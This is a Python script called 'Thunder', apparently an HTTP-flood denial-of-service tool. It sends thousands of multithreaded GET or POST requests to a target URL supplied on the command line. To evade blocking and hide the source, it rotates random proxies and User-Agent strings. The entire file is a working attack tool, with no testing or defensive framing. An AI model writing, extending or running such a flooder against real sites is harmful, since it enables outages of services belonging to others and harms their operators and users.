import os
from concurrent.futures import ThreadPoolExecutor, as_completed

import argparse
import requests
from colorama import Fore, init
from tqdm import tqdm
import random

from proxy import get_proxies
from banner import logo
from uagents import get_random_uagent

init(autoreset=True)

proxies =  None
method = None

def check_target(target_url, proxies):
    global method
    try:
        test_resp = requests.get(target_url, proxies=proxies)
        if test_resp.status_code == 200:
            method = "GET"
            return True
        else:
            test_resp_post = requests.post(target_url, proxies=proxies)
            if test_resp_post.status_code == 200:
                method = "POST"
                return True
            else:
                print(Fore.YELLOW + "Error: Could not determine the correct method.")
                exit(1)
    except Exception as e:
        print(Fore.RED + f"URL Error: {e}")
        exit(1)
    return False


def send_request(i, target_url, proxy_list):
    try:
        uagent = get_random_uagent()
        proxy = get_random_proxy(proxy_list)
        if method == "GET":
            resp = requests.get(target_url, proxies=proxy, timeout=2, headers={"User-Agent": uagent})
        else:
            resp = requests.post(target_url, proxies=proxy, timeout=2, headers={"User-Agent": uagent})
        return resp.status_code
    except Exception as e:
        return str(e)

def get_random_proxy(proxy_list):
    if proxy_list:
        return random.choice(proxy_list)
    return None

if __name__ == "__main__":
    logo()

    parser = argparse.ArgumentParser(description="Thunder")
    parser.add_argument("target", help="Target url")
    parser.add_argument("-p", "--packages", help="Packages count", type=int, default="10000")
    parser.add_argument("-t", "--threads", help="Threads count", type=int, default="1")
    args = parser.parse_args()

    proxy_list = get_proxies()
    if proxy_list:
        proxies = get_random_proxy(proxy_list)
    
    if check_target(args.target, proxies):
        print(Fore.GREEN + "Using method: ", method)
        print(Fore.YELLOW + "Packages: ", args.packages)
        print(Fore.YELLOW + "Threads: ", args.threads)
        print(Fore.YELLOW + "Proxies: ", proxies)
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {executor.submit(send_request, i, args.target, proxy_list): i for i in range(args.packages)}
            for future in tqdm(
                as_completed(futures), total=args.packages, desc="Processing", unit="req"
            ):
                status = future.result()
                log_entry = f"Request {future}: Status code - {status}\n"
                if status == 200:
                    tqdm.write(
                        Fore.GREEN + f"Status code for {args.target} - {status} - {method}"
                    )
                else:
                    tqdm.write(Fore.RED + f"Status code for {args.target} - {status} - {method}")

